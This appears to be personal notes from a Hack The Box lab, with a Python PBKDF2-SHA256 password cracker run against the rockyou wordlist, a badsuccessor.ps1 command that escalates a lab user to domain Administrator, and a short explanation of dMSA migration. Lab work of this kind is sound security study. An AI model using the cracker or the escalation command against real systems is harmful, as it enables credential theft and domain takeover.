Password cracker: 
```python
#!/usr/bin/env python3
import hashlib
from multiprocessing import Pool, cpu_count

def check_password(password):
    try:
        computed = hashlib.pbkdf2_hmac(
            'sha256',
            password,
            SALT.encode(),
            ITERATIONS
        )
        if computed.hex() == TARGET_HASH:
            return password.decode(errors="ignore")
    except:
        pass
    return None


# ---- Hash components ----
SALT = "AMtzteQIG7yAbZIa"
ITERATIONS = 600000
TARGET_HASH = "0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"

# ---- Your wordlist path ----
WORDLIST = "/usr/share/wordlists/rockyou.txt"


def main():
    print(f"[+] Using wordlist: {WORDLIST}")
    print("[+] Starting PBKDF2-SHA256 cracking...")

    with open(WORDLIST, "rb") as f:
        passwords = (line.strip() for line in f)

        with Pool(cpu_count()) as pool:
            for result in pool.imap_unordered(check_password, passwords, chunksize=500):
                if result:
                    print(f"[+] PASSWORD FOUND: {result}")
                    pool.terminate()
                    return

    print("[-] No match found.")


if __name__ == "__main__":
    main()
```

Privilege Escalation

./badsuccessor.ps1 escalate -targetOU "OU=staff,DC=eighteen, DC=htb" -dmsa enc-dmsa -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" -dnshostname enc_dmsa -user adam.scott -dc-ip 127.0.0.1



## What is a dMSA ?
A dMSA is typically created to replace any existing legacy service account. To enable a seamless transition, a dMSA can inherit the permissions of the legacy account by performing a migration process. This migration flow tightly couples the dMSA to the *superseded account*, that is the original account they meant to replace. That flow and the permissions it grants along the way is where things get interesting.

The migration process of a dMSA can be trigered by calling the new **Start-ADServiceAccountMigration** cmdlet.
Internally, it calls a new LDAP rootDSE operation named **migrateADServiceAccount**, which takes the following arguments: 
	- The Distinguished Name (DN) of the dMSA
	- The DN of the superseded account
	- A constant corresponding to *StartMigration*

The migration status of a dMSA is dictated by the **msDS-DelegatedMSAStateAttribute**, anew attribute that determines the current state of the dMSA. There is currently no official documentation of this attribute, so the following table is based on a personal behavioral analysis and experimentation:

![[Pasted image 20251210123719.png]]